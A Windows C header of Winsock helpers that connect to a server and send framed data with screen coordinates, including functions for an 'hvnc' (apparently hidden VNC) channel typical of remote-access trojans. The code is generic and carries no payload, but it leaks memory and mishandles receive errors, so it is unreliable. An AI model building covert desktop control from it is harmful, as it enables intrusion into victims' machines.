#ifndef SOCKSLIB_INCLUDED
#define SOCKSLIB_INCLUDED
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

int sendsock(SOCKET* ConnectSocket, const char* sendbuf, unsigned int len){
    int iResult;
    iResult = send(*ConnectSocket, sendbuf, len, 0);
    if (iResult == SOCKET_ERROR){
        closesocket(*ConnectSocket);
        WSACleanup();
        return 1;
    }
    return 0;
}
int hvnc_sock_send(const char* data, int len, int x, int y, SOCKET sock){
    char* dat = calloc(len+16, 1);
    char magic[4] = "DATA";
    memcpy(dat, magic, 4);
    memcpy(dat+4, &len, 4);
    memcpy(dat+8, &x, 4);
    memcpy(dat+12, &y, 4);
    memcpy(dat+16, data, len);
    if(send(sock, dat, len+16, 0) == SOCKET_ERROR) goto err;
    return 0;
err:
    closesocket(sock);
    return -1;
}
char* vnc_sock_recv(SOCKET sock){
    char* dat = calloc(9, 1);
    if(recv(sock, dat, 9, MSG_WAITALL) <= 0){
        free(dat);
        closesocket(sock);
        return NULL;
    }
    return dat;
}
int vnc_sock_send(const char* data, int len, int x, int y, SOCKET sock){
    char* dat = calloc(len+12, 1);
    memcpy(dat, &len, 4);
    memcpy(dat+4, &x, 4);
    memcpy(dat+8, &y, 4);
    memcpy(dat+12, data, len);
    if(send(sock, dat, len+12, 0) == SOCKET_ERROR) goto err;
    return 0;
err:
    closesocket(sock);
    return -1;
}

int newsock(const char* servername, int port, SOCKET* ConnectSocket){
    WSADATA wsaData;
    struct addrinfo *result = NULL, hints;
    int iResult;
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0)
        return 1;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    char portstr[20] = {0};
    itoa(port, portstr, 10);
    iResult = getaddrinfo(servername, portstr, &hints, &result);
    if (iResult != 0)
        return 1;

    // Attempt to connect to an address until one succeeds
    // Create a SOCKET for connecting to server
    *ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (*ConnectSocket == INVALID_SOCKET)
        return 1;

    // Connect to server.
    iResult = connect( *ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR){
        closesocket(*ConnectSocket);
        *ConnectSocket = INVALID_SOCKET;
        return 1;
    }

    freeaddrinfo(result);

    if (*ConnectSocket == INVALID_SOCKET)
        return 1;
    return 0;
}
int popsockint(SOCKET* ConnectSocket){
    int iRes;
    int data = 0;
    iRes = recv(*ConnectSocket, (unsigned char*)(&data), 4, MSG_WAITALL);
    if(!(iRes>0)) return -1;
    return data;
}
int sockrecv(SOCKET* ConnectSocket, char* out, int len){
    int iResult = 0;
    if(out==NULL){
        out=calloc(len,1);
        iResult = recv(*ConnectSocket, out, len, MSG_WAITALL);
        if (!(iResult > 0)) {
            return -1;
        }
        free(out);
    }else{
        int cumsum = 0;
        while(cumsum < len){
            iResult = recv(*ConnectSocket, out + cumsum, len - cumsum, MSG_WAITALL);
            cumsum += iResult;
        }
        if (!(iResult > 0)) {
            return -1;
        }
    }
    return iResult;
}
int sockrecva(SOCKET* ConnectSocket, char* out, int len){
    int iResult = 0;
    iResult = recv(*ConnectSocket, out, len, 0);
    if(!(iResult>0)) return -1;
    return iResult;
}
void closesock(SOCKET* ConnectSocket){
    closesocket(*ConnectSocket);
}
#endif